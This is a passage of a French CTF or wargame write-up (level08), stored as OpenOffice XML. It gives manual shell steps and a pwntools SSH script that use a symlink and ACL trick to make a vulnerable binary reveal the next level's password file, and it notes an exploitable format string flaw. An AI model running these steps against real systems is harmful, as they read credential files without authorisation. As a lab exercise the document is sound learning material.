      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images4" text:anchor-type="paragraph" svg:x="0.159cm" svg:y="-0.016cm" svg:width="16.999cm" svg:height="8.1cm" draw:z-index="3"><draw:image xlink:href="Pictures/200000070000467E00002198339C9136.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt;&gt; <text:span text:style-name="T13">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On suit simplement toutes les étapes précédentes :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ chmod 777 .</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ mv level08 binary</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ mkdir level08</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ setfacl -m u:level09:rwx ./level08/</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ ln -s /home/users/level09/.pass lnk</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">$ ./binary ../level08/lnk</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T12">$ cat level08/lnk</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt;&gt; </text:span><text:span text:style-name="T14">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T16"> </text:span><text:span text:style-name="T5">pwn</text:span><text:span text:style-name="T16"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T16"> </text:span><text:span text:style-name="T7">*</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T6">s</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ssh(host=</text:span><text:span text:style-name="T10">"192.168.1.3"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">port=</text:span><text:span text:style-name="T9">4242</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">user=</text:span><text:span text:style-name="T10">"level08"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">password=</text:span><text:span text:style-name="T10">"7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process([</text:span><text:span text:style-name="T10">"/bin/sh"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"-c"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"chmod 777 . &amp;&amp; mv level08 binary &amp;&amp; mkdir level08 &amp;&amp; setfacl -m u:level09:rwx level08/ &amp;&amp; ln -s /home/users/level09/.pass lnk &amp;&amp; ./binary ../level08/lnk"</text:span><text:span text:style-name="T6">])</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process([</text:span><text:span text:style-name="T10">"/bin/cat"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"level08/lnk"</text:span><text:span text:style-name="T6">])</text:span></text:p>
      <text:p text:style-name="P5">p.interactive()</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T15">NOTE :</text:span><text:span text:style-name="T16"> Il ne s'agissait probablement pas de la résolution attendue pour ce level. En effet, le programme comporte une </text:span><text:span text:style-name="T17">format string vulnerability </text:span><text:span text:style-name="T16">assez évidente (notée dans la retranscription du code source ci-dessus). En effet, la fonction </text:span><text:span text:style-name="T17">snprintf</text:span><text:span text:style-name="T16"> qui écrit dans le fichier de log accepte en chaîne de format une variable qu'on contrôle (argv[1], censé être le nom de fichier). Ainsi, on peut faire quelque chose comme :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images5" text:anchor-type="paragraph" svg:x="-0.021cm" svg:y="0.355cm" svg:width="13.019cm" svg:height="1.96cm" draw:z-index="4"><draw:image xlink:href="Pictures/20000007000032DB000007A7FE559B8E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16">Les format specifiers sont bien interprétés, la faille est présente. J'ai un peu la flemme de mettre en application la faille, mais </text:span><text:span text:style-name="T17">NX </text:span><text:span text:style-name="T16">est désactivé, tout comme le PIE, et on dispose de variables d'environnement où mettre du shellcode donc ça devrait pas être très compliqué.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><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3M51S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-10T23:49:22.03</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="5" meta:object-count="0" meta:page-count="6" meta:paragraph-count="112" meta:word-count="1106" meta:character-count="7116"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>